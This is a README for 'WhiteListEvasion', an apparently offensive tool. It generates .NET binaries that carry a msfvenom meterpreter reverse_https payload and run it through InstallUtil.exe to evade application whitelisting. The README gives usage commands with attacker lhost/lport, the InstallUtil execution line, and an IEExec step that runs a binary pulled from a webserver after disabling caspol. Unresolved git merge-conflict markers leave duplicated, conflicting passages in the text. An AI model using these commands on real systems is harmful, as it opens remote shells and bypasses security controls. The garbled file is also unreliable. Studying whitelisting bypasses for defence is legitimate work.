# WhiteListEvasion

1. InstallUtil.py

   Usage:
   python InstallUtil.py [--cs_file cs_filename] [--exe_name exe_filename] [--payload payload] [--lhost lhost] [--lport lport]

   python InstallUtil.py --cs_file temp.cs --exe_name temp.exe --payload windows/meterpreter/reverse_https --lhost 192.168.1.11 --lport 443

<<<<<<< HEAD
   Script that generates a .NET binary that attempts to leverage the InstallUtil.exe whitelist evasion technique.  this is accomplished by importing a msfvenom generated payload into the c_sharp template found here: http://www.room362.com/blog/2014/01/16/application-whitelist-bypass-using-ieexec-dot-exe/  . This template is then incorporated into the InstallUtil PoC found here: https://github.com/subTee/ShmooCon-2015/blob/master/CaseySmith-SimpleWindowsApplicationWhitelistingEvasion .  One thing of note:  The payload architecture must match the Framework subdir in the .NET path or the binary will crash.
=======
   Script that generates a .NET binary that attempts to leverage the InstallUtil.exe whitelist evasion technique.  this is accomplished by importing a msfvenom generated payload into the c_sharp template found here: http://www.room362.com/blog/2014/01/16/application-whitelist-bypass-using-ieexec-dot-exe/  . This template is then incorporated into the InstallUtil PoC found here: https://github.com/subTee/ShmooCon-2015/blob/master/CaseySmith-SimpleWindowsApplicationWhitelistingEvasion .  One thing of note:  The payload architecture must match the Framework subdir in the .NET path or the binary wil crash.
>>>>>>> 1f03b61af97f1d065563db1de546d9e3deb3feba

  Script.cs and script.exe are example output from InstallUtil.py.  To execute the execute, simply get the binary on disk and then run (something much like):
  C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U script.exe

  Requires mono, mono-develop, Python 2.7+, msfvenom (from metasploit). Tested and verified the script on a Kali linux VM.  Both 32-bit and 64-bit binaries tested and verified on Windows 7 with .NET 4.5.    

<<<<<<< HEAD
2. Test64 (IEExec 64-bit test application)

	Host this binary on a webserver.  To observe the binary without .NET Security, open up an administrative console, cd to C:\Windows\Microsoft.NET\Framework\v2.05727\ and then run 'caspol -s off'.  In an another window (can be non administrative), cd to the same .NET directory and execute IEExec <path to your file hosted on webserver>.  An example would look like this:
	C:\Windows\Microsoft.NET\Framework\v2.05727\> IEExec http://testserver.org/files/test64.exe
	
	To observe with .NET Security enabled, just simply run the above without ever disabling caspol.  You should be able to pull down strings from a file hosted by a webserver, but unable to execute,read, or write anything on the host system.
	
	To build the binary, ensure you have the x64 profile set in Visual Studio 2013.
	
=======
>>>>>>> 1f03b61af97f1d065563db1de546d9e3deb3feba
khr0x40sh@gmail.com 
